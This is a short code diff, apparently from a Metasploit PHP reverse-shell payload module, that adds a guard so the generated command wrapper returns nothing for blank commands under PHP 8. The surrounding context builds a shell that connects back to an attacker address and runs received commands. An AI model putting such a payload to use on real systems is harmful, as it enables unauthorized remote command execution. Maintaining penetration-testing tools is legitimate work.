@@ -57,6 +57,8 @@ module MetasploitModule
       socket_family = 'AF_INET6'
     end
 
+    # CommandShell sends newline probes after token reads; PHP 8 rejects their
+    # empty arguments in several execution functions.
     shell = <<-END_OF_PHP_CODE
     #{php_preamble(disabled_varname: '$dis')}
     $ipaddr='#{ipaddr}';
@@ -65,6 +67,9 @@ module MetasploitModule
     if(!function_exists('#{exec_funcname}')){
       function #{exec_funcname}($c){
         global $dis;
+        if(trim($c)===''){
+          return '';
+        }
         #{php_system_block(cmd_varname: '$c', disabled_varname: '$dis', output_varname: '$o')}
         return $o;
       }
